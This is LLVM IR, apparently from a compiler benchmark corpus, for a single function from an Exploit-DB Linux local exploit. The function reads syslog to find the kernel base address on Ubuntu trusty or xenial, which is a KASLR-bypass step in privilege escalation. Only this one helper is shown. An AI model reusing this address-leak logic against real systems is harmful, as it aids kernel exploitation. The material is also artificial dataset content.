; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_47169.c_get_kernel_addr_syslog.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_47169.c_get_kernel_addr_syslog.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32 }

@.str = private unnamed_addr constant [22 x i8] c"[.] trying syslog...\0A\00", align 1
@.str.1 = private unnamed_addr constant [7 x i8] c"trusty\00", align 1
@kernels = common dso_local global %struct.TYPE_2__* null, align 8
@kernel = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [7 x i8] c"xenial\00", align 1
@.str.3 = private unnamed_addr constant [37 x i8] c"[-] kernel base not found in syslog\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i64 @get_kernel_addr_syslog() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i64 0, i64* %2, align 8
  %5 = call i32 @dprintf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0))
  %6 = call i32 @mmap_syslog(i8** %3, i32* %4)
  %7 = icmp ne i32 %6, 0
  br i1 %7, label %9, label %8

8:                                                ; preds = %0
  store i64 0, i64* %1, align 8
  br label %40

9:                                                ; preds = %0
  %10 = load %struct.TYPE_2__*, %struct.TYPE_2__** @kernels, align 8
  %11 = load i64, i64* @kernel, align 8
  %12 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %10, i64 %11
  %13 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %12, i32 0, i32 0
  %14 = load i32, i32* %13, align 4
  %15 = call i64 @strcmp(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0), i32 %14)
  %16 = icmp eq i64 %15, 0
  br i1 %16, label %17, label %21

17:                                               ; preds = %9
  %18 = load i8*, i8** %3, align 8
  %19 = load i32, i32* %4, align 4
  %20 = call i64 @get_kernel_addr_trusty(i8* %18, i32 %19)
  store i64 %20, i64* %2, align 8
  br label %21

21:                                               ; preds = %17, %9
  %22 = load %struct.TYPE_2__*, %struct.TYPE_2__** @kernels, align 8
  %23 = load i64, i64* @kernel, align 8
  %24 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %22, i64 %23
  %25 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %24, i32 0, i32 0
  %26 = load i32, i32* %25, align 4
  %27 = call i64 @strcmp(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0), i32 %26)
  %28 = icmp eq i64 %27, 0
  br i1 %28, label %29, label %33

29:                                               ; preds = %21
  %30 = load i8*, i8** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = call i64 @get_kernel_addr_xenial(i8* %30, i32 %31)
  store i64 %32, i64* %2, align 8
  br label %33

33:                                               ; preds = %29, %21
  %34 = load i64, i64* %2, align 8
  %35 = icmp ne i64 %34, 0
  br i1 %35, label %38, label %36

36:                                               ; preds = %33
  %37 = call i32 @dprintf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.3, i64 0, i64 0))
  br label %38

38:                                               ; preds = %36, %33
  %39 = load i64, i64* %2, align 8
  store i64 %39, i64* %1, align 8
  br label %40

40:                                               ; preds = %38, %8
  %41 = load i64, i64* %1, align 8
  ret i64 %41
}

declare dso_local i32 @dprintf(i8*) #1

declare dso_local i32 @mmap_syslog(i8**, i32*) #1

declare dso_local i64 @strcmp(i8*, i32) #1

declare dso_local i64 @get_kernel_addr_trusty(i8*, i32) #1

declare dso_local i64 @get_kernel_addr_xenial(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
